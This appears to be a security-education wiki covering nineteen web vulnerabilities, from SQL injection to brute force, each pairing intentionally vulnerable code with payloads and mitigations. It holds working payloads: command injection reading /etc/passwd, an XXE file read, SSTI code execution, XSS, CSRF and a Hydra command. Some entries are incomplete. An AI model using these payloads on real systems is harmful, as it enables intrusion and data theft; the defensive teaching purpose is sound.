


# 🌐 Welcome to the WebVuln- Wiki!

- Documenting **100+ web vulnerabilities** with testing tools and mitigation strategies.

---

## 🧨 PART 1: INJECTION EXPLOITS

---

### 🔹 WebVuln-001: SQL Injection

**Category:**  
Injection

**Vulnerability ID:**  
`WEBVULN-001`

---

### 🧪 Demo / Proof of Concept (PoC)

#### 📌 Scenario:
A login form vulnerable to SQL Injection uses the following query:

```sql
SELECT * FROM users WHERE username = '$username' AND password = '$password';
```


Password can be anything.

✅ **Effect:**  
Bypasses authentication by always evaluating the WHERE clause as true.

---

🌐 **PoC Platforms:**  
You can simulate this vulnerability using:

- DVWA
- bWAPP
- WebGoat

---

🛡️ **Mitigation**  
✅ Use prepared statements / parameterized queries (e.g., `mysqli`, `PDO` in PHP)  
✅ Use ORM frameworks that handle escaping automatically  
✅ Enforce strict input validation and whitelisting  
✅ Disable detailed SQL error messages in production environments

---

🔧 **Testing Tools / Techniques**  
- sqlmap  
- Burp Suite (Community / Pro)  
- OWASP ZAP  
- Manual testing using known payloads

---

📚 **References**  
- OWASP SQL Injection  
- PortSwigger: SQL Injection  
- OWASP Cheat Sheet: SQL Injection Prevention



***

## WEBVULN-002: Cross-Site Scripting (XSS)

### 🗂️ Category
Injection

### ⚠️ Vulnerability Overview
Cross-Site Scripting (XSS) allows attackers to inject malicious scripts into content served to other users. It can lead to session hijacking, defacement, or redirection to malicious sites.

---

### 🧪 Demo / Proof of Concept

**Scenario:**  
A search field reflects input directly back into the HTML without sanitization:

```html
<p>You searched for: <?php echo $_GET['q']; ?></p>

```
### ✅ Result
The script executes in the user's browser, demonstrating a reflected XSS.

---

### 🧪 Test Environment

- [DVWA](http://www.dvwa.co.uk/)
- [bWAPP](http://www.itsecgames.com/)
- [XSS Game by Google](https://xss-game.appspot.com/)

---

### 🔒 Mitigation

- Escape output using appropriate HTML entity encoding
- Use Content Security Policy (CSP)
- Sanitize input on the server and client side
- Prefer safe frameworks that auto-sanitize (e.g., React, Angular)
- Avoid `innerHTML`, `document.write`, and inline event handlers

---

### 🛠️ Testing Tools / Techniques

- **Burp Suite**
- **OWASP ZAP**
- **XSS Hunter** (for stored XSS tracking)
- Manual payloads:
  ```html
  <img src=x onerror=alert(1)>
  <svg/onload=alert(1)>

***

## WEBVULN-003: Cross-Site Request Forgery (CSRF)

### 🗂️ Category
Broken Authentication / Session Management

### ⚠️ Vulnerability Overview
Cross-Site Request Forgery (CSRF) tricks a logged-in user into executing unwanted actions on a web application where they’re authenticated. Exploits rely on the user's browser automatically including session cookies.

---

### 🧪 Demo / Proof of Concept

**Scenario:**  
A vulnerable banking app allows fund transfers via a simple GET request:

`http://vulnerable-bank.com/transfer?amount=1000&to=attacker_account`

If the user is authenticated, this request will succeed.

**Attack Example:**  
An attacker can embed this into an image or hidden form on a malicious website:

```html
<img src="http://vulnerable-bank.com/transfer?amount=1000&to=attacker_account">

```
### Result:


If a logged-in user visits the attacker’s page, the browser sends the request with session cookies — and funds get transferred without the user’s knowledge.

***

### 🧪 Test Environment

- [DVWA](http://www.dvwa.co.uk/)
- [bWAPP](http://www.itsecgames.com/)
- [WebGoat](https://owasp.org/www-project-webgoat/)

---

### 🔒 Mitigation

- Use anti-CSRF tokens (e.g., synchronizer tokens, double submit cookies)
- Validate `Origin` and `Referer` headers
- Use the `SameSite` cookie attribute (`SameSite=Lax` or `SameSite=Strict`)
- Require re-authentication or CAPTCHA for sensitive operations
- Avoid using GET for state-changing actions

---

### 🛠️ Testing Tools / Techniques

- **Burp Suite Pro** (includes CSRF PoC generator)
- **OWASP ZAP**
- Manual testing using crafted HTML forms or `curl`
- Check for missing CSRF tokens in sensitive POST requests

---

### 📚 References

- [OWASP CSRF Page](https://owasp.org/www-community/attacks/csrf)
- [PortSwigger CSRF Guide](https://portswigger.net/web-security/csrf)
- [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)

***
## WEBVULN-004: Remote Code Execution (RCE)

### 🗂️ Category
Injection / Critical

### ⚠️ Vulnerability Overview
Remote Code Execution (RCE) allows an attacker to execute arbitrary system-level code on the target server. This is one of the most dangerous vulnerabilities, often leading to full system compromise, lateral movement, and persistence.

---

### 🧪 Demo / Proof of Concept

**Scenario:**  
A web application allows users to ping a host:

```php
<?php
$host = $_GET['host'];
echo shell_exec("ping -c 1 " . $host);
?>

```
---
**Malicious Input:**


`127.0.0.1; whoami`

**Result:**

The command runs ping, then executes whoami, returning the server's current user.

**Alternative PoC Payloads:**

Linux:

`127.0.0.1; ls /`

Windows:

`127.0.0.1 & dir`

---

### 🧪 Test Environment

- [DVWA](http://www.dvwa.co.uk/)
- [bWAPP](http://www.itsecgames.com/)
- [Vulhub – RCE Labs](https://github.com/vulhub/vulhub)

---

### 🔒 Mitigation

- Never pass user input directly to system calls or `eval()` functions
- Use allowlists to strictly validate and sanitize inputs
- Avoid dangerous functions: `eval()`, `exec()`, `shell_exec()`, `popen()`, etc.
- Run applications with least privileges (non-root where possible)
- Use Web Application Firewalls (WAFs) for added detection and protection

---

### 🛠️ Testing Tools / Techniques

- **Burp Suite Intruder**
- **Metasploit Framework**
- **Commix** (for command injection automation)
- Manual fuzzing with OS-specific payloads
- Monitor logs and output for signs of command execution

---

### 📚 References

- [OWASP RCE Guide](https://owasp.org/www-community/attacks/Command_Injection)
- [PortSwigger RCE](https://portswigger.net/web-security/os-command-injection)
- [GTFOBins](https://gtfobins.github.io/) — post-exploitation techniques


***
## WEBVULN-005: Command Injection

### 🗂️ Category
Injection

### ⚠️ Vulnerability Overview
Command Injection occurs when user input is passed directly to a system shell or command interpreter without proper sanitization. This allows attackers to execute arbitrary commands on the host system, potentially leading to full server compromise.

---

### 🧪 Demo / Proof of Concept

**Scenario:**  
A web app provides a functionality to check server reachability:

```php
<?php
$ip = $_GET['ip'];
echo shell_exec("ping -c 1 " . $ip);
?>

```
---

**Malicious Input:**

`127.0.0.1; uname -a`

**Result:**

- Executes ping, then `uname -a`, leaking system info.

**PoC Payloads:**

**Linux:**

```
127.0.0.1; id
127.0.0.1 && cat /etc/passwd
```
**Windows:**

```
127.0.0.1 & whoami
127.0.0.1 | dir
```

***
### 🧪 Test Environment

- [DVWA](http://www.dvwa.co.uk/)
- [bWAPP](http://www.itsecgames.com/)
- [Vulhub – Command Injection Labs](https://github.com/vulhub/vulhub/tree/master/command-injection)

---

### 🔒 Mitigation

- Avoid executing system commands with user input
- Use safe APIs that don’t involve shell invocation
- Implement strict input validation and allowlists
- Escape shell metacharacters if shell execution is unavoidable
- Apply least privilege principles on server processes

---

### 🛠️ Testing Tools / Techniques

- **Burp Suite Repeater/Intruder**
- **Commix** (automated command injection)
- **Metasploit Framework**
- Manual testing with OS-specific payloads
- Monitor system command logs and anomalies

---

### 📚 References

- [OWASP Command Injection Guide](https://owasp.org/www-community/attacks/Command_Injection)
- [PortSwigger Command Injection](https://portswigger.net/web-security/os-command-injection)
- [GTFOBins](https://gtfobins.github.io/) — for command abuse post-exploitation


***

## WEBVULN-006: Insecure Direct Object Reference (IDOR)

### 🗂️ Category
Broken Access Control

### ⚠️ Vulnerability Overview
IDOR occurs when an application exposes internal object references (like IDs, filenames, or usernames) without proper access control checks. Attackers can manipulate these references to access unauthorized data or functions.

---

### 🧪 Demo / Proof of Concept

**Scenario:**  
A user profile is accessed via:

---
`GET /profile?user_id=1001`

- Changing the `user_id` to another value (e.g., `1002`) reveals another user's profile:

`GET /profile?user_id=1002`


**Result:**  
Sensitive information is disclosed due to missing authorization checks.

---

### 🧪 Test Environment

- [DVWA](http://www.dvwa.co.uk/)
- [bWAPP](http://www.itsecgames.com/)
- [OWASP Juice Shop](https://owasp.org/www-project-juice-shop/)

---

### 🔒 Mitigation

- Enforce access control checks server-side for every resource
- Do not expose predictable object references (use UUIDs or indirect mapping)
- Avoid relying on client-side authorization
- Log and monitor unauthorized access attempts

---

### 🛠️ Testing Tools / Techniques

- **Burp Suite** (manual ID tampering)
- **Postman** or custom scripts for API fuzzing
- Review server logs for abnormal ID access patterns
- Automated tools (e.g., **Autorize** Burp plugin)

---

### 📚 References

- [OWASP IDOR Guide](https://owasp.org/www-community/attacks/Insecure_Direct_Object_Reference)
- [PortSwigger IDOR](https://portswigger.net/web-security/access-control/idor)
- [OWASP Top 10: Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)

---
## WEBVULN-007: XML Injection

### 🗂️ Category
Injection

### ⚠️ Vulnerability Overview
XML Injection occurs when user input is inserted into an XML document or query without proper sanitization. This can lead to data manipulation, authentication bypass, or even denial of service. It’s commonly seen in SOAP-based services or applications parsing XML.

---

### 🧪 Demo / Proof of Concept

**Scenario:**  
A login system accepts XML-based input:

```xml
<user>
    <username>admin</username>
    <password>admin</password>
</user>

```
---

Result:
The attacker bypasses authentication if the XML is used in backend XPath or SQL queries without sanitization.

Other Payloads:

```xml

<user><name>John</name><role>admin</role></user>

```
- Insert additional nodes
- Modify structure of parsed XML
- Exploit backend processing logic

---

### 🧪 Test Environment

- [bWAPP](http://www.itsecgames.com/)
- [OWASP WebGoat](https://owasp.org/www-project-webgoat/)
- Custom SOAP/XML-based test APIs

---

### 🔒 Mitigation

- Always sanitize and encode user input before inserting into XML
- Use secure XML parsers with entity resolution disabled
- Apply schema validation (XSD) for expected structure
- Avoid string concatenation when building XML
- Enable logging and anomaly detection for malformed XML inputs

---

### 🛠️ Testing Tools / Techniques

- **Burp Suite** (modify XML requests)
- **SOAPUI** for testing SOAP/XML APIs
- Manual injection with crafted XML payloads
- Look for unauthenticated access, malformed parsing, or logic bypass

---

### 📚 References

- [OWASP XML Injection Guide](https://owasp.org/www-community/attacks/XML_Injection)
- [PortSwigger XML Injection](https://portswigger.net/web-security/xml-injection)
- [OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)

---
## WEBVULN-008: LDAP Injection

### 🗂️ Category
Injection

### ⚠️ Vulnerability Overview
LDAP Injection occurs when untrusted user input is embedded into an LDAP query without proper sanitization. Attackers can manipulate LDAP filters to bypass authentication, escalate privileges, or extract sensitive directory data.

---

### 🧪 Demo / Proof of Concept

**Scenario:**  
A login form uses LDAP to authenticate:

```java
String ldapFilter = "(uid=" + user + ")";
```
**Malicious Input:**

```
Username: *)(uid=*

```

**Result:**
- LDAP filter becomes:

```
(uid=*)(uid=*)

```
- This can match all users and allow login bypass or unauthorized access.

**Other Payloads:**

- Authentication Bypass:

```
admin*)(userPassword=*
Privilege Escalation:
```
```
*)(|(admin=*))(
```
---
### 🧪 Test Environment

- [bWAPP](http://www.itsecgames.com/)
- [OWASP WebGoat](https://owasp.org/www-project-webgoat/)
- Custom apps with OpenLDAP backend

---

### 🔒 Mitigation

- Sanitize and validate all user input before including it in LDAP queries
- Use parameterized LDAP queries (e.g., with JNDI, .NET DirectoryServices)
- Apply allowlists for input fields (e.g., usernames, emails)
- Escape special characters in LDAP queries: `()|&!*=\<>~`

---

### 🛠️ Testing Tools / Techniques

- **Burp Suite**
- Manual testing with crafted LDAP filter payloads
- Inspect backend logs for suspicious filter manipulation
- Use fuzzing to detect filter anomalies

---

### 📚 References

- [OWASP LDAP Injection Guide](https://owasp.org/www-community/attacks/LDAP_Injection)
- [PortSwigger LDAP Injection](https://portswigger.net/web-security/ldap-injection)
- [OWASP Input Validation Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html)


***
## 🛡️ WEBVULN-009: XPath Injection

- **Category:** Injection  
- **Vulnerability ID:** WEBVULN-009  
- **Name:** XPath Injection  

---

### 🔍 Description
**XPath Injection** occurs when user-controlled input is unsafely embedded into XPath queries used to retrieve or manipulate data from XML documents. This allows attackers to alter the structure of the query, potentially bypassing authentication, accessing unauthorized data, or triggering denial of service.

---

### 🧪 Example / Proof of Concept

#### Vulnerable Code (PHP Example):
```php
$username = $_POST['username'];
$password = $_POST['password'];

$xml = simplexml_load_file('users.xml');
$result = $xml->xpath("//user[username/text()='$username' and password/text()='$password']");
```
---

**Attack Payload:**
```
Username: ' or '1'='1
Password: ' or '1'='1

```
**Resulting XPath:**
```
//user[username/text()='' or '1'='1' and password/text()='' or '1'='1']

```
- This always evaluates to true, allowing an attacker to bypass authentication.

### 🛡️ Mitigation

- **Input Validation & Escaping**: Always sanitize and escape user input to avoid breaking out of query structure.
- **Parameterized Queries**: Use libraries that support parameterized XPath expressions to prevent injection.
- **Avoid XML for Authentication**: Prefer secure, database-backed authentication systems where possible.
- **Least Privilege**: Ensure XML files and applications accessing them follow the principle of least privilege.

---

### 🧰 Testing Tools / Techniques

- **Manual Testing**: Try injecting XPath payloads into fields used in XML queries.
- **Burp Suite**: Intercept and modify XML requests.
- **OWASP ZAP**: Scan for XML/XPath injection points.
- **FuzzDB**: Use known XPath injection payloads for fuzzing.

---

### 📚 References

- [OWASP: XML External Entity (XXE) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
- [PortSwigger: XPath Injection](https://portswigger.net/web-security/xpath-injection)

---
## WEBVULN-010: HTML Injection

- **Category:** Injection  
- **Vulnerability ID:** WEBVULN-010  
- **Name:** HTML Injection  

---

### 🔍 Description

**HTML Injection** is a type of injection attack where malicious HTML code is inserted into a web page. If the application improperly handles or sanitizes user input, an attacker can manipulate the content or structure of the page — potentially leading to content spoofing, redirection, or even client-side script execution in some cases.

While similar to Cross-Site Scripting (XSS), **HTML Injection** focuses on injecting HTML **without JavaScript execution**, often for defacement, phishing, or UI redressing.

---

### 🧪 Example / Proof of Concept

#### Vulnerable Code (PHP Example):
```php
$name = $_GET['name'];
echo "<p>Welcome, $name!</p>";
```
**Attack Payload:**

`<script>alert('Injected!')</script>

**Rendered Result:**

`<p>Welcome, <script>alert('Injected!')</script>!</p>`
- If output is not properly encoded, this executes a script (XSS), or at minimum injects unwanted HTML.

---

### 🛡️ Mitigation

- **Output Encoding**: Use proper output encoding (e.g., `htmlspecialchars()` in PHP) when displaying user input.
- **Input Validation**: Reject or sanitize input containing HTML tags unless explicitly intended.
- **Content Security Policy (CSP)**: Implement CSP headers to mitigate the risk of HTML/JS being misused in the browser.
- **Framework Defaults**: Use frameworks that automatically escape output (e.g., Django, Rails, React).

---

### 🧰 Testing Tools / Techniques

- **Manual Testing**: Inject simple HTML tags like `<b>`, `<i>`, `<h1>`, or `<img src=x onerror=alert(1)>` to observe behavior.
- **Burp Suite**: Intercept and modify inputs; view response rendering.
- **OWASP ZAP**: Perform automated scanning to detect HTML injection vulnerabilities.
- **Browser DevTools**: Inspect rendered HTML and DOM for unexpected elements.

---

### 📚 References

- [OWASP: HTML Injection](https://owasp.org/www-community/attacks/HTML_Injection)
- [PortSwigger: HTML Injection](https://portswigger.net/web-security/html-injection)

***

## 🛡️ WEBVULN-011: Open Redirect

- **Category:** Validation & Redirects  
- **Vulnerability ID:** WEBVULN-011  
- **Name:** Open Redirect

---

### 🔍 Description

**Open Redirect** occurs when a web application allows untrusted input to control the URL to which a user is redirected after clicking a link or submitting a form. This can be exploited by attackers to redirect victims to malicious sites — often used in phishing or malware distribution.

---

### 🧪 Example / Proof of Concept

#### Vulnerable URL:

---

#### Exploit:
An attacker can send a user the following URL:
---

If the site blindly redirects to `url`, the user is taken to a malicious destination while thinking they're interacting with a trusted domain.

---

### 🛡️ Mitigation

- **Allowlist URLs**: Only allow redirects to trusted domains or specific internal paths.
- **Validate & Sanitize Input**: Block full URLs and only allow relative paths where possible.
- **Display Warning Pages**: Inform users when they are being redirected off-site.
- **Avoid External Redirects**: Where possible, avoid user-controlled redirection entirely.

---

### 🧰 Testing Tools / Techniques

- **Manual Testing**: Modify `redirect`, `url`, or `next` parameters with external links.
- **Burp Suite**: Intercept requests and test for open redirect behavior.
- **OWASP ZAP**: Scan for open redirect issues using the automated scanner.
- **Payloads**:

---

---

### 📚 References

- [OWASP: Open Redirect](https://owasp.org/www-community/attacks/Unvalidated_Redirects_and_Forwards)
- [PortSwigger: Open Redirect](https://portswigger.net/web-security/open-redirect)

---

## WEBVULN-012: XML External Entity (XXE) Injection

### 🧠 Description
XXE occurs when an XML input containing a reference to an external entity is processed by a weakly configured XML parser. This can lead to:

- Disclosure of internal files
- Server-side request forgery (SSRF)
- Denial of Service (DoS)
- Remote code execution (in extreme cases)

### 🚨 Example Payload
```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```
### 🛡️ Mitigation
- **Disable External Entities**: Configure your XML parsers to disallow `DOCTYPE` declarations and external entities.
- **Use Secure Parsers**: Prefer libraries with secure-by-default configurations (e.g., `defusedxml` in Python).
- **Input Validation**: Validate and sanitize XML input from untrusted sources.
- **Limit Permissions**: Restrict file system and network access from XML parsers whenever possible.

### 🧰 Testing Tools / Techniques
- **Manual Payload Injection**: Insert external entity definitions and monitor server behavior.
- **Burp Suite**: Use the XXE plugin or manually inject XXE payloads in intercepted requests.
- **OWASP ZAP**: Automated scanners can identify some XXE vulnerabilities.
- **XXEinjector**: A specialized tool for exploiting XXE vulnerabilities.

### 📚 References
- [OWASP: XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
- [PortSwigger: XXE Injection](https://portswigger.net/web-security/xxe)

---
***


## WEBVULN-013: Server-Side Includes (SSI) Injection

### 🧠 Description
SSI injection occurs when user input is embedded in files that are parsed by the web server for Server Side Includes (SSI). If the input is not properly sanitized, attackers can inject SSI directives that get executed by the server, leading to:

- Execution of arbitrary commands
- Disclosure of sensitive files
- Unauthorized access or data manipulation

This vulnerability typically affects older or misconfigured servers like Apache with `mod_include` enabled.

### 🚨 Example Payloads

Injecting SSI code into a vulnerable field:

```html
<!--#exec cmd="ls"-->
```
---
### ⚠️ Real-World Impact
- Gaining access to sensitive system files  
- Running arbitrary shell commands on the server  
- Leveraging for further attacks like privilege escalation  

---

### 🛡️ Mitigation
- **Disable SSI**: If not required, turn off SSI processing in your web server configuration.
- **Sanitize Input**: Properly validate and sanitize all user input to avoid injection into SSI-parsed files.
- **Use HTTP Headers**: Set `X-Content-Type-Options: nosniff` and related headers to reduce abuse.
- **Use Safer Templating**: Avoid legacy templating mechanisms that rely on SSI.

---

### 🧰 Testing Tools / Techniques
- **Manual Injection**: Inject known SSI payloads (`<!--#exec cmd="id"-->`) and observe the output.
- **Burp Suite**: Modify requests to test for reflected SSI behavior.
- **OWASP ZAP**: Scan for potential injection vectors.
- **Logs**: Check server logs for unexpected command execution patterns.

---

### 📚 References
- [OWASP: SSI Injection](https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection)  
- [PortSwigger: SSI Injection](https://portswigger.net/web-security/ssrf)  
- [Apache SSI Guide](https://httpd.apache.org/docs/current/howto/ssi.html)
---
***
## WEBVULN-014: HTTP Response Splitting

### 🧠 Description
HTTP Response Splitting is a vulnerability that arises when user-supplied data is included in HTTP headers without proper sanitization. By injecting CRLF (carriage return `\r` and line feed `\n`) characters, attackers can manipulate the structure of the HTTP response, potentially:

- Injecting malicious headers
- Triggering cross-site scripting (XSS)
- Redirecting users
- Performing cache poisoning

---

### 💥 Example Payloads

Injected input:
`%0d%0aSet-Cookie: session=attacker`

`When reflected in a vulnerable header (e.g., `Location`, `Set-Cookie`), this can split the response: `

`HTTP/1.1 302 Found Location: /somepath Set-Cookie: session=attacker `

---

### ⚠️ Real-World Impact
- Cookie manipulation
- HTTP header injection
- XSS through crafted responses
- Cache poisoning and phishing

---

### 🛡️ Mitigation
- **Input Validation**: Strip or encode CR (`\r`) and LF (`\n`) characters from user inputs used in HTTP headers.
- **Use Frameworks**: Leverage secure web frameworks that automatically sanitize headers.
- **Avoid Direct Header Manipulation**: Always validate and encode user input before using it in `Location`, `Set-Cookie`, etc.
- **Security Libraries**: Use libraries with strict header handling.

---

### 🧰 Testing Tools / Techniques
- **Manual Testing**: Try injecting `%0d%0a` into inputs reflected in headers.
- **Burp Suite**: Modify HTTP request headers to observe response manipulation.
- **OWASP ZAP**: Automated detection of header-based injections.
- **Fuzzing**: Use payloads with CRLF characters in fuzzing tools.

---

### 📚 References
- [OWASP: HTTP Response Splitting](https://owasp.org/www-community/attacks/HTTP_Response_Splitting)  
- [PortSwigger: HTTP Response Splitting](https://portswigger.net/web-security/response-splitting)

***

### 🛡️ WEBVULN-015: OS Command Injection

🔹 Category
Injection

### 🆔 Vulnerability ID
**WEBVULN-015**

🧪 Demo / Proof of Concept (PoC)
✅ Example 1: Vulnerable Python Code (using os.system)
```python

import os
user_input = input("Enter filename: ")
os.system(f"ls {user_input}")

```
Exploit:


`Input: ; whoami`
Result: Executes `ls ; whoami`

✅ Example 2: Vulnerable PHP Code
```php

<?php
$cmd = $_GET['cmd'];
system("ping -c 1 " . $cmd);
?>

```
**Exploit:**


`URL: http://example.com/vuln.php?cmd=127.0.0.1;id`
`Result: Executes `ping -c 1 127.0.0.1;id``

**🛡️ Mitigation**

**✅ Safe Coding Practices**
- Avoid directly using user input in system-level commands.

- Use whitelisting, parameterized functions, or safe APIs.

- In Python, prefer subprocess.run() with list-based arguments and shell=False.

Example Fix (Python):
```
import subprocess
user_input = input("Enter filename: ")
subprocess.run(["ls", user_input], shell=False)
```
Example Fix (PHP):
```php

<?php
$allowed = ['127.0.0.1', 'localhost'];
$target = $_GET['cmd'];
if (in_array($target, $allowed)) {
    system("ping -c 1 " . escapeshellarg($target));
}
?>
```
🔧 Testing Tools / Techniques
- Burp Suite (Intruder, Repeater)

- OWASP ZAP

- Commix – Automated command injection tool

Manual Fuzzing: Use payloads like ; whoami, && ls, | id, etc.

**📚 References**
- OWASP: Command Injection

- PortSwigger: OS command injection

- [PayloadsAllTheThings - Command Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)


***

### 🛡️ WEBVULN-016: Blind SQL Injection

**🔹 Category**
Injection

**🆔 Vulnerability ID**

**WEBVULN-016**

---
🧪 Demo / Proof of Concept (PoC)
✅ Example: Vulnerable PHP Code (Login Form)
```php

<?php
$user = $_GET['user'];
$query = "SELECT * FROM users WHERE username = '$user'";
$result = mysqli_query($conn, $query);
if (mysqli_num_rows($result)) {
    echo "User exists";
} else {
    echo "User not found";
}
?>
```
**🎯 Exploit Example (Boolean-based):**
```vbnet

Input: ' OR 1=1 -- 
Response: "User exists"
```

**🎯 Exploit Example (Blind Boolean-based):**
```vbnet

Input: ' AND 1=1 -- 
Result: Normal response
Input: ' AND 1=2 -- 

```
Result: Different response (indicating conditional logic success)

**🎯 Exploit Example (Time-based):**
```sql

Input: ' OR IF(1=1, SLEEP(5), 0) -- 

```
Response delay indicates SQL injection success.

**🛡️ Mitigation**

✅ Use Parameterized Queries / Prepared Statements
PHP (mysqli with prepared statements):
```php

$stmt = $conn->prepare("SELECT * FROM users WHERE username = ?");
$stmt->bind_param("s", $user);
$stmt->execute();
```
**✅ Input Validation & Escaping**
Use whitelisting for input validation.

Escape output using context-aware functions.

**✅ Least Privilege**
Ensure the database user has limited permissions.

**🔧 Testing Tools / Techniques**
Burp Suite (Repeater/Intruder with boolean and time-based payloads)

- SQLMap (automates detection and exploitation)

- Manual Injection using:

- Boolean-based payloads: ' AND 1=1 --, ' AND 1=2 --

- Time-based payloads: ' OR SLEEP(5) --

**📚 References**
- OWASP: Blind SQL Injection

- PortSwigger: Blind SQL Injection

- [PayloadsAllTheThings - SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

***

### 🛡️ WEBVULN-017: Server-Side Template Injection (SSTI)
🔹 Category
Injection

**🆔 Vulnerability ID**
### WEBVULN-017

**🧪 Demo / Proof of Concept (PoC)**

---

```python
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/greet')
def greet():
    name = request.args.get("name", "")
    template = f"Hello {name}!"
    return render_template_string(template)

```
---
**🎯 Exploit (Jinja2 - Flask)**
`Input: {{7*7}}`
`Result: "Hello 49!"`

---
**🎯 Malicious Payload (Remote Code Execution PoC)**
`{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}`

---
**🛡️ Mitigation**

**✅ Avoid render_template_string**
- Use render_template() with static templates, never dynamic template strings.

**✅ Sanitize User Input**
- Do not trust user input within templates.

- Escaping input is not enough — separate logic and presentation.

**✅ Template Sandboxing**
- Use template sandboxing if supported (e.g., Jinja2 sandbox).

- Limit access to sensitive classes or globals.

---
**🔧 Testing Tools / Techniques**

- Manual Testing using common payloads:

- `{{7*7}}`

-`{{"".__class__.__mro__[1].__subclasses__()}}`

- Burp Suite – Manual payload testing and automation

- Template-Scanner – Automated SSTI scanner

    
🔎 Common Payloads

| Payload                                                                 | Purpose              |
|-------------------------------------------------------------------------|----------------------|
| `{{7*7}}`                                                               | Arithmetic test      |
| `{{ ''.__class__ }}`                                                    | Class object access  |
| `{{ self._TemplateReference__context.cycler.__init__.__globals__.os.system('id') }}` | RCE attempt|

**📚 References**
- PortSwigger: SSTI

- OWASP: SSTI

- [PayloadsAllTheThings - SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)

***
## PART II 
### Broken Authentication and Session Management

###🛡️ WEBVULN-018: Broken Authentication and Session Management (Session Fixation)
🔹 Category
- Authentication & Session Management

**🆔 Vulnerability ID**
**WEBVULN-018**

**🧪 Demo / Proof of Concept (PoC)**

---
**✅ What is Session Fixation?**

Session Fixation is a vulnerability where an attacker sets or predicts a user's session ID before they authenticate. If the session is not regenerated upon login, the attacker can hijack it once the victim logs in.

**✅ Example: Vulnerable PHP Logic**
```php

<?php
session_id($_GET['sessid']);
session_start();
// ... user logs in ...
?>
```
**🎯 Attack Flow:**
Attacker sends victim a link:
`https://example.com/login.php?sessid=abc123`

- Victim logs in with session ID abc123

- Attacker reuses the same session ID to impersonate the victim

**🛡️ Mitigation**
**✅ Regenerate Session ID After Login**
```php

<?php
session_start();
// after successful authentication
session_regenerate_id(true);
```
---

### ✅ Set Secure Session Attributes

- Use `HttpOnly`, `Secure`, and `SameSite` cookie flags
- Set short session expiration times
- Avoid exposing `session_id` via URLs

---

### 🔧 Testing Tools / Techniques

- **Burp Suite**:
  - Intercept and replay requests with fixed session IDs
  - Check for `Set-Cookie` header before and after login
- **OWASP ZAP**
- Manual analysis of session behavior

---

### 🔍 Indicators of Vulnerability

| Behavior                                      | Risk                        |
|-----------------------------------------------|-----------------------------|
| Session ID remains the same before/after login | High risk of session fixation |
| Session ID exposed in URL                     | High risk of hijacking      |
| No use of `session_regenerate_id()`           | Poor session handling       |

---

### 📚 References

- [OWASP: Session Fixation](https://owasp.org/www-community/attacks/Session_fixation)
- [OWASP Top 10 - Broken Authentication](https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/)
- [PortSwigger: Session Fixation](https://portswigger.net/web-security/authentication/session-fixation)


---
**🧪 Hands-On: Session Fixation Demo**

**🧰 Requirements**
- Python 3

- Flask

- Browser

- Burp Suite (optional, for analysis)

---
**🚧 Vulnerable Flask App (for demo/testing)**

```python
# session_fixation_vuln.py
from flask import Flask, session, request, redirect, url_for, make_response

app = Flask(__name__)
app.secret_key = "super_secret_key"

@app.route('/')
def index():
    user = session.get('user')
    return f"👤 Logged in as: {user}" if user else "🔓 Not logged in"

@app.route('/set_session')
def set_session():
    session_id = request.args.get("sessid")
    resp = make_response(redirect(url_for('login')))
    if session_id:
        resp.set_cookie('session', session_id)
    return resp

@app.route('/login')
def login():
    session['user'] = "admin"
    return redirect(url_for('index'))

if __name__ == '__main__':
    app.run(debug=True)

```
**🧪 Exploit Steps**

- Attacker sends victim a crafted link:

```bash

http://localhost:5000/set_session?sessid=attacksessionid

```
- Victim clicks link and logs in at /login

- Session ID is reused from attacker: attacksessionid

- Attacker accesses / with the same session ID

```nginx

curl -b "session=attacksessionid" http://localhost:5000/

```

**🎯 Gets access to the authenticated session!**

**🛡️ Fix (in Flask)**
-Replace this line inside /login route:

```python

session['user'] = "admin"

```
- With a secure version that regenerates the session:

```python

from flask import session
session.clear()
session['user'] = "admin"
Optionally rotate the session cookie with:
```

```python

@app.before_request
def make_session_permanent():
    session.permanent = True
```
---

**🧪 Analyze with Burp Suite**
- Intercept login requests.

- Compare session cookies before and after login.

- If session ID doesn’t change → 🔥 Vulnerable to fixation!

***
**🛡️ WEBVULN-019: Brute Force Attack**
🔹 Category

Authentication

**🆔 Vulnerability ID**
**WEBVULN-019**

**🧪 Demo / Proof of Concept (PoC)**

**✅ What is a Brute Force Attack?**

- A Brute Force Attack is an automated method to guess credentials (usernames, passwords, PINs, tokens) by trying many combinations until access is granted.

**✅ Vulnerable PHP Login Example**
```php

<?php
$user = $_POST['username'];
$pass = $_POST['password'];

if ($user == "admin" && $pass == "123456") {
    echo "Login successful";
} else {
    echo "Invalid credentials";
}
```
**🎯 Attack Using Hydra (Example)**
```bash

`hydra -l admin -P /usr/share/wordlists/rockyou.txt http://target.com/login.php -V`
```
-l: login/username

-P: password list

-V: verbose output

---

### 🛡️ Mitigation

#### ✅ Account Lockout or Rate Limiting
- Temporarily block accounts after multiple failed logins (e.g., 5 tries)
- Use exponential back-off for delays

#### ✅ CAPTCHA or Bot Protection
- Use CAPTCHA to prevent automated logins
- Use WAFs or bot detection services

#### ✅ 2FA / MFA
- Enforce two-factor authentication to reduce the risk of credential stuffing

#### ✅ Logging & Monitoring
- Log failed login attempts
- Alert administrators on unusual behavior

---

### 🔧 Testing Tools / Techniques

- **Hydra**
- **Burp Suite Intruder**
- **OWASP ZAP**
- Manual login testing with predictable passwords

---

